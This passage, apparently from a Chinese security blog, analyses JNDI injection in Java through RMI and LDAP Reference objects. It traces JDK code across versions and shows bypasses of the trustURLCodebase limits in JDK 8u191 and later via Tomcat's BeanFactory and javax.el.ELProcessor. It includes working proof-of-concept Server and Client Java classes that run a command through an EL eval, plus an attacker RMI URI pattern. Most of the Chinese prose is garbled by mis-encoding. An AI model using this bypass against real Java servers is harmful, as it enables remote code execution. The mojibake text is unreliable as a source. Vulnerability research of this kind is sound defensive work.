href="https://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a></li><li>JDK 7u131 <a href="https://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a></li><li>JDK 8u121 <a href="https://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></li></ul><p>æ¡ˆä¾‹å‚è€ƒç¬”è®°ï¼š<a href="mweblib://15800918927450" target="_blank" rel="noopener">æ·±å…¥ç†è§£RMI&amp;JRMP&amp;JNDI</a></p><h3 id="è§¦å‘è¿‡ç¨‹åˆ†æ"><a href="#è§¦å‘è¿‡ç¨‹åˆ†æ" class="headerlink" title="è§¦å‘è¿‡ç¨‹åˆ†æ"></a>è§¦å‘è¿‡ç¨‹åˆ†æ</h3><h4 id="ä½ç‰ˆæœ¬8u73æµ‹è¯•"><a href="#ä½ç‰ˆæœ¬8u73æµ‹è¯•" class="headerlink" title="ä½ç‰ˆæœ¬8u73æµ‹è¯•"></a>ä½ç‰ˆæœ¬8u73æµ‹è¯•</h4><p>äº§ç”ŸJNDIæ³¨å…¥çš„åŸå› æ˜¯å®¢æˆ·ç«¯<code>lookup</code>æ–¹æ³•å¯æ§ï¼Œæˆ‘ä»¬å…ˆåœ¨Registryä¸­æ³¨å†Œæ¶æ„çš„Referenceå¯¹è±¡ï¼ŒåŠ è½½è¿œç¨‹ç±»å¯¹è±¡ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782231.jpg" alt="-w1162"></p><p>å°†Registryçš„urlåœ°å€ä¼ å…¥<code>InitialContext.lookup(URL)</code>æ–¹æ³•ä¸­ï¼Œè¿™é‡Œç”¨ä½ç‰ˆæœ¬8u73ä¸‹æ–­ç‚¹è°ƒè¯•:<br>/com/sun/jndi/toolkit/url/GenericURLContext.class<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782239.jpg" alt="-w1278"><br>è§£æURLï¼Œå°†Exploitç±»ä¼ å…¥ï¼Œ<code>lookup</code>æ–¹æ³•è°ƒç”¨<code>decodeObject</code>æ–¹æ³•ï¼š/com/sun/jndi/rmi/registry/RegistryContext.class<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782247.jpg" alt="-w1330"><br>åˆè¿›å…¥åˆ°<code>NamingManager.getObjectInstance</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782254.jpg" alt="-w1325"><br>åœ¨è¿›å…¥<code>getObjectInstance</code>æ–¹æ³•ååˆåœ¨319è¡Œè°ƒç”¨<code>getObjectFactoryFromReference</code>æ–¹æ³•ï¼Œå…ˆä»æœ¬åœ°çš„ç±»åŠ è½½å™¨å»<code>classpath</code>åŠ è½½ç›®æ ‡ç±»ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è°ƒç”¨<code>loadClass(factoryName, codebase)</code>å»è¿œç¨‹åŠ è½½æˆ‘ä»¬æ„é€ çš„ç‰¹å®šç±»ï¼Œå¹¶å°†å…¶å®ä¾‹åŒ–ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782262.jpg" alt="-w1391"></p><p> <img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782270.jpg" alt="-w1335"></p><p>æ•´ä¸ªåˆ©ç”¨æµç¨‹ï¼š</p><ul><li>ç›®æ ‡ä»£ç ä¸­è°ƒç”¨äº†InitialContext.lookup(URI)ï¼Œä¸”URIä¸ºç”¨æˆ·å¯æ§ï¼›</li><li>æ”»å‡»è€…æ§åˆ¶URIå‚æ•°ä¸ºæ¶æ„çš„RMIæœåŠ¡åœ°å€ï¼Œå¦‚ï¼šrmi://hacker_rmi_server/classnameï¼›</li><li>å‡»è€…RMIæœåŠ¡å™¨å‘ç›®æ ‡è¿”å›ä¸€ä¸ªReferenceå¯¹è±¡ï¼ŒReferenceå¯¹è±¡ä¸­æŒ‡å®šæŸä¸ªç²¾å¿ƒæ„é€ çš„Factoryç±»ï¼›</li><li>ç›®æ ‡åœ¨è¿›è¡Œlookup()æ“ä½œæ—¶ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶å®ä¾‹åŒ–Factoryç±»ï¼Œæ¥ç€è°ƒç”¨factory.getObjectInstance()è·å–å¤–éƒ¨è¿œç¨‹å¯¹è±¡å®ä¾‹ï¼›</li><li>æ”»å‡»è€…å¯ä»¥åœ¨Factoryç±»æ–‡ä»¶çš„æ„é€ æ–¹æ³•ã€é™æ€ä»£ç å—ã€getObjectInstance()æ–¹æ³•ç­‰å¤„å†™å…¥æ¶æ„ä»£ç ï¼Œè¾¾åˆ°RCEçš„æ•ˆæœï¼›</li></ul><h4 id="é«˜ç‰ˆæœ¬8u201æµ‹è¯•"><a href="#é«˜ç‰ˆæœ¬8u201æµ‹è¯•" class="headerlink" title="é«˜ç‰ˆæœ¬8u201æµ‹è¯•"></a>é«˜ç‰ˆæœ¬8u201æµ‹è¯•</h4><p>å†æ¥çœ‹çœ‹é«˜ç‰ˆæœ¬8u201ï¼Œåœ¨RegistryContext.class#decodeObjectå‡½æ•°ä¸­ï¼Œå¢åŠ äº†<code>trustURLCodebase</code>çš„åˆ¤æ–­ï¼Œä¸”é»˜è®¤ä¸º<code>false</code>ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782278.jpg" alt="-w1243"></p><p>å¤šä¸ªåˆ¤æ–­æ˜¯é€»è¾‘ä¸çš„å…³ç³»ï¼Œæœ‰ä¸€ä¸ªä¸æˆç«‹åˆ™å¯é€šè¿‡ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨<code>var8.getFactoryClassLocation()</code>ä¸º<code>null</code>è¿›å…¥<code>NamingManager.getObjectInstance</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782291.jpg" alt="-w1448"><br>æ¥ç€è¿›å…¥<code>getObjectFactoryFromReference</code>å‡½æ•°ï¼Œä½†æ˜¯åœ¨åŠ è½½è¿œç¨‹ç±»ä¹‹å‰åˆè¿›è¡Œäº†ä¸€æ¬¡<code>null</code>åˆ¤æ–­ï¼ŒåŠ è½½è¿œç¨‹ç±»ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782299.jpg" alt="-w1200"></p><p>æ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨æ¡ä»¶å°±å˜æˆäº†åªèƒ½ç”¨<code>helper.loadClass(factoryName)</code>åŠ è½½ç›®æ ‡æœºå™¨ä¸­<code>classpath</code>ä¸­çš„ç±»ã€‚ä»ä¸‹å›¾NamingManager.javaçš„ä»£ç ä¸­å¯ä»¥çŸ¥é“ï¼Œè¯¥ç±»è¦å®ç° <code>javax.naming.spi.ObjectFactory</code>æ¥å£ï¼Œä¸”å­˜åœ¨<code>getObjectInstance</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782308.jpg" alt="-w1364"></p><p>æ€»ç»“ä¸€ä¸‹é«˜ç‰ˆæœ¬åˆ©ç”¨æ¡ä»¶å³ï¼š</p><ul><li>åˆ©ç”¨ç›®æ ‡æœºå™¨<code>classpath</code>ç±»</li><li>å®ç°äº†<code>javax.naming.spi.ObjectFactory</code>æ¥å£</li><li>å­˜åœ¨<code>getObjectInstance</code>æ–¹æ³•</li></ul><p>åœ¨ä¸‹æ–‡ä¸­ä¼šä»‹ç»è¯¦ç»†æ¡ˆä¾‹åˆ©ç”¨ç»†èŠ‚ã€‚</p><h2 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP + JNDI Reference Payload"></a>LDAP + JNDI Reference Payload</h2><p>é™¤äº†RMIæœåŠ¡ä¹‹å¤–ï¼ŒJNDIè¿˜å¯ä»¥å¯¹æ¥LDAPæœåŠ¡ï¼ŒLDAPä¹Ÿèƒ½è¿”å›JNDI Referenceå¯¹è±¡ï¼Œåˆ©ç”¨è¿‡ç¨‹ä¸ä¸Šé¢RMI ReferenceåŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯lookup()ä¸­çš„URLä¸ºä¸€ä¸ªLDAPåœ°å€ï¼šldap://xxx/xxxï¼Œç”±æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„çš„JNDI Referenceå¯¹è±¡ã€‚å¹¶ä¸”LDAPæœåŠ¡çš„Referenceè¿œç¨‹åŠ è½½Factoryç±»ä¸å—ä¸Šä¸€ç‚¹ä¸­ <code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>ç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚<br>ä¸è¿‡åœ¨2018å¹´10æœˆï¼ŒJavaæœ€ç»ˆä¹Ÿä¿®å¤äº†è¿™ä¸ªåˆ©ç”¨ç‚¹ï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ï¼Œåœ¨Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å <code>com.sun.jndi.ldap.object.trustURLCodebase</code> å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseï¼Œè¿˜å¯¹åº”çš„åˆ†é…äº†ä¸€ä¸ªæ¼æ´ç¼–å·CVE-2018-3149ã€‚</p><p>æ¡ˆä¾‹å‚è€ƒç¬”è®°ï¼š<a href="mweblib://15800918927450" target="_blank" rel="noopener">æ·±å…¥ç†è§£RMI&amp;JRMP&amp;JNDI</a></p><p>è¿™é‡Œä¸ºäº†æ¢ç©¶å…·ä½“çš„ä¿®æ”¹ç‚¹ï¼Œè·Ÿè¿›äº†8u181å’Œ8u201ä¸¤ä¸ªç‰ˆæœ¬çš„ldapåŠ è½½æµç¨‹ï¼Œè§£æcodebaseçš„æµç¨‹ä¸å—<code>com.sun.jndi.rmi.object.trustURLCodebase`</code>com.sun.jndi.cosnaming.object.trustURLCodebase<code>å±æ€§å½±å“ï¼Œä½†åœ¨æœ€ååŠ è½½è¿œç¨‹classçš„å‡½æ•°</code>helper.loadClass(factoryName, codebase)<code>é«˜ç‰ˆæœ¬8u201æ¡ä»¶æ·»åŠ äº†</code>trustURLCodebase`(é»˜è®¤ä¸ºfalse)çš„æ ¡éªŒï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782315.jpg" alt="-w803"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782328.jpg" alt="-w1449"></p><h2 id="ç»•è¿‡JDK-8u191-ç­‰é«˜ç‰ˆæœ¬é™åˆ¶"><a href="#ç»•è¿‡JDK-8u191-ç­‰é«˜ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="ç»•è¿‡JDK 8u191+ç­‰é«˜ç‰ˆæœ¬é™åˆ¶"></a>ç»•è¿‡JDK 8u191+ç­‰é«˜ç‰ˆæœ¬é™åˆ¶</h2><p>æ‰€ä»¥å¯¹äºOracle JDK 11.0.1ã€8u191ã€7u201ã€6u211æˆ–è€…æ›´é«˜ç‰ˆæœ¬çš„JDKæ¥è¯´ï¼Œé»˜è®¤ç¯å¢ƒä¸‹ä¹‹å‰è¿™äº›åˆ©ç”¨æ–¹å¼éƒ½å·²ç»å¤±æ•ˆã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥è¿›è¡Œç»•è¿‡å¹¶å®Œæˆåˆ©ç”¨ã€‚ä¸¤ç§ç»•è¿‡æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°CLASSPATHä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„Reference Factoryå·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„Factoryç±»æ‰§è¡Œå‘½ä»¤ã€‚</li><li>åˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–Gadgetå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚</li><li>JRMPï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&amp;mid=2247483796&amp;idx=1&amp;sn=ce4249ba61d7f402a1211e508f83d2b4&amp;chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1577970121763&amp;sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">ç©ºæŒ‡é’ˆ-treasure-Writeup</a><br>è¿™ä¸‰ç§æ–¹å¼éƒ½ä¾èµ–å—å®³è€…æœ¬åœ°CLASSPATHä¸­ç¯å¢ƒï¼Œéœ€è¦åˆ©ç”¨å—å®³è€…æœ¬åœ°çš„Gadgetè¿›è¡Œæ”»å‡»ã€‚</li></ol><h3 id="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶"><a href="#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶"></a>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶</h3><p>åœ¨ä¸Šæ–‡ä¸­<em>RMI + JNDI Reference Payload</em>éƒ¨åˆ†æˆ‘ä»¬å·²ç»ä»‹ç»äº†åœ¨é«˜ç‰ˆæœ¬ä¿®å¤ç­–ç•¥ï¼Œä»¥åŠç»•è¿‡çš„åˆ©ç”¨æ¡ä»¶ã€‚åœ¨<code>org.apache.naming.factory.BeanFactory</code>ä¸­åˆšå¥½æ»¡è¶³æ¡ä»¶å¹¶ä¸”å­˜åœ¨è¢«åˆ©ç”¨çš„å¯èƒ½ï¼Œè¯¥æ¥å£å­˜åœ¨äºTomcatä¾èµ–åŒ…ä¸­ï¼Œä½¿ç”¨ä¹Ÿæ˜¯éå¸¸å¹¿æ³›ã€‚</p><p><strong>ç¯å¢ƒæ­å»º</strong><br>ä¹‹å‰ç”¨pom.xmlæ‹‰tomcatçš„åŒ…å¤ç°èœœæ±åŸå› å¤±è´¥ï¼Œåæ¥ç”¨çš„MxSrvsé‡Œè‡ªå¸¦çš„tomcatä¾èµ–å¤ç°æˆåŠŸäº†ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782342.jpg" alt="-w1393"><br>ä¸ºäº†ä¾¿äºåˆ†æå»å¯¼ä¸ªæºç ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œç‚¹ä¸‹å›¾æ‰€ç¤ºçš„View All<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782353.jpg" alt="-w811"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782363.jpg" alt="-w783"><br>ç„¶åå»ideaé‡Œå¯¼å…¥å°±è¡Œäº†</p><p><strong>æ¼æ´å¤ç°</strong><br>poc:<br>Server.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, (String)<span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"a=eval"</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"a"</span>, <span class="string">"Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\")"</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">"EvalObj"</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">"the Server is bind rmi://127.0.0.1:1098/EvalObj"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Client.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/EvalObj"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri); <span class="comment">// è¿”å›åŠ è½½çš„è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782374.jpg" alt="-w1541"></p><p><strong>æ¼æ´åˆ†æ</strong><br>/org/apache/naming/factory/BeanFactory.java è¿™ä¸ªç±»æ»¡è¶³ä¸Šè¿°æåˆ°çš„é«˜ç‰ˆæœ¬åˆ©ç”¨çš„ä¸¤ä¸ªæ¡ä»¶ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782382.jpg" alt="-w1105"><br>BeanFactory.java#getObjectInstanceï¼Œä»ä¸Šæ–‡<em>RMI + JNDIæ³¨å…¥çš„è§¦å‘æµç¨‹</em>åˆ†æä¸­å¯ä»¥çŸ¥é“ï¼Œå¯æ§å‚æ•°ä¸º<code>obj</code>å’Œ<code>name</code>ã€‚<br>è¿™é‡Œé™åˆ¶äº†ä¼ å…¥çš„å¯¹è±¡å¿…é¡»ä¸º<code>ResourceRef</code>ç±»ï¼Œé€šè¿‡åå°„è°ƒç”¨åœ¨148è¡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªæ— å‚å¯¹è±¡ï¼Œæ„å‘³ç€<code>beanClass</code>å¾—æœ‰ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782392.jpg" alt="-w1149"></p><p>æ¥ç€å–å‡ºkeyä¸º<code>forceString</code>çš„å€¼è¿›è¡Œä»¥<code>,</code>åˆ†å‰²ï¼Œæ‹†åˆ†<code>=</code>é”®å€¼å¯¹ï¼Œå­˜å…¥<code>hashMap</code>å¯¹è±¡ä¸­ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782403.jpg" alt="-w1240"></p><p>å…¶åé€šè¿‡åå°„æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„ä¹‹å‰æ„é€ çš„æ–¹æ³•ï¼Œå¹¶å¯ä»¥ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å‚æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782414.jpg" alt="-w1219"></p><p>åˆ°è¿™é‡Œåˆ©ç”¨è¿‡ç¨‹å°±ç»“æŸäº†ï¼Œå†æ¥è·Ÿä¸€ä¸‹åˆ©ç”¨é™åˆ¶å¦‚ä½•æ»¡è¶³ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯ä¼ å…¥çš„å¯¹è±¡å¿…é¡»æ˜¯å±äº<code>ResourceRef</code>ç±»ï¼Œæ¥ç€è°ƒç”¨äº†<code>ref.getClassName()</code>è·å–<code>beanClassName</code>ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡ç±»ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782422.jpg" alt="-w933"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782429.jpg" alt="-w582"></p><p>è·Ÿè¿›<code>ResourceRef</code>ç±»ï¼Œè¯¥ç±»ä¹Ÿæ˜¯<code>Reference</code>çš„å­ç±»ï¼Œåœ¨å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•ä¼ å…¥ç›®æ ‡classï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782438.jpg" alt="-w855"><br>é€šè¿‡è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•å®ç°æˆå‘˜å˜é‡<code>className</code>çš„èµ‹å€¼<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782445.jpg" alt="-w924"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782452.jpg" alt="-w494"></p><p>å†æ¥BeanFactory.javaçœ‹ä¸€ä¸‹<code>ref.get(&quot;forceString&quot;)</code>æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæˆ‘ä»¬è¦å¦‚æœæ„é€ pocæ§åˆ¶<code>forceString</code>å‚æ•°ï¼ŒåŒæ ·çš„ä¹Ÿæ˜¯åœ¨Reference.javaä¸­é€šè¿‡éå†æˆå‘˜å˜é‡<code>addrs</code>æ•°ç»„æ¥è¿›è¡Œå¯»æ‰¾ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782459.jpg" alt="-w702"></p><p>åœ¨Reference.javaä¸­æ‰¾åˆ°æ§åˆ¶addrså…ƒç´ çš„åŠæ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782467.jpg" alt="-w689"><br>è¦æ±‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ª<code>RefAddr</code>ç±»å‹çš„<code>addr</code>ï¼Œåœ¨å…¶å­ç±»æœ‰ä¸€ä¸ª<code>StringRefAddr</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782477.jpg" alt="-w935"><br>æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥è®¾ç½®å±æ€§ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ResourceRef().add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"xxx"</span>))</span><br></pre></td></tr></table></figure></p><p>åœ¨veracodeåšå®¢ä¸­æ„é€ çš„beanClassæ˜¯<code>javax.el.ELProcessor</code>ï¼Œ<code>ELProcessor</code>ä¸­æœ‰ä¸ª<code>eval(String)</code>æ–¹æ³•å¯ä»¥æ‰§è¡ŒELè¡¨è¾¾å¼ï¼Œ<code>javax.el.ELProcessor</code>æ˜¯Tomcat8ä¸­çš„åº“ï¼Œæ‰€ä»¥ä»…é™Tomcat8åŠæ›´é«˜ç‰ˆæœ¬ç¯å¢ƒä¸‹å¯ä»¥é€šè¿‡è¯¥åº“è¿›è¡Œæ”»å‡»ã€‚</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782489.jpg" alt="-w1598"></p><blockquote><p>ç¿»äº†ä¸€äº›èµ„æ–™è¿˜æœ‰ä¸€äº›å…¶ä»–çš„ç±»ç¬¦åˆæ¡ä»¶å¯ä»¥ä½œä¸ºbeanClassæ³¨å…¥åˆ°BeanFactoryä¸­å®ç°åˆ©ç”¨ï¼Œæ¯”å¦‚<a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">Orangeå¸ˆå‚…çš„Jenkinsæ¼æ´å®ç°åˆ©ç”¨</a>ï¼Œå…ˆæŒ–ä¸ªå‘ã€‚</p></blockquote><h3 id="åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶"><a href="#åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶"></a>åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶</h3><p>ç›®å½•æ˜¯ä¸€ç§åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿã€‚LDAPå…¨ç§°æ˜¯è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼ˆThe Lightweight Directory Access Protocolï¼‰ï¼Œå®ƒæä¾›äº†ä¸€ç§æŸ¥è¯¢ã€æµè§ˆã€æœç´¢å’Œä¿®æ”¹äº’è”ç½‘ç›®å½•æ•°æ®çš„æœºåˆ¶ï¼Œè¿è¡Œåœ¨TCP/IPåè®®æ ˆä¹‹ä¸Šï¼ŒåŸºäºC/Sæ¶æ„ã€‚é™¤äº†RMIæœåŠ¡ä¹‹å¤–ï¼ŒJNDIä¹Ÿå¯ä»¥ä¸LDAPç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’ï¼ŒJavaå¯¹è±¡åœ¨LDAPç›®å½•ä¸­ä¹Ÿæœ‰å¤šç§å­˜å‚¨å½¢å¼ï¼š</p><ul><li>Javaåºåˆ—åŒ–</li><li>JNDI Reference</li><li>Marshalledå¯¹è±¡</li><li>Remote Location (å·²å¼ƒç”¨)<br>LDAPå¯ä»¥ä¸ºå­˜å‚¨çš„Javaå¯¹è±¡æŒ‡å®šå¤šç§å±æ€§ï¼š</li><li>javaCodeBase</li><li>objectClass</li><li>javaFactory</li><li>javaSerializedData</li></ul><p>è¿™é‡Œ javaCodebase å±æ€§å¯ä»¥æŒ‡å®šè¿œç¨‹çš„URLï¼Œè¿™æ ·é»‘å®¢å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–ä¸­çš„classï¼Œé€šè¿‡JNDI Referenceçš„æ–¹å¼è¿›è¡Œåˆ©ç”¨ã€‚ä½†æ˜¯é«˜ç‰ˆæœ¬JVMå¯¹Reference Factoryè¿œç¨‹åŠ è½½ç±»è¿›è¡Œäº†å®‰å…¨é™åˆ¶ï¼ŒJVMä¸ä¼šä¿¡ä»»LDAPå¯¹è±¡ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åŠ è½½çš„è¿œç¨‹ç±»ã€‚</p><p>æ­¤æ—¶ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚LDAP Serveré™¤äº†ä½¿ç”¨JNDI 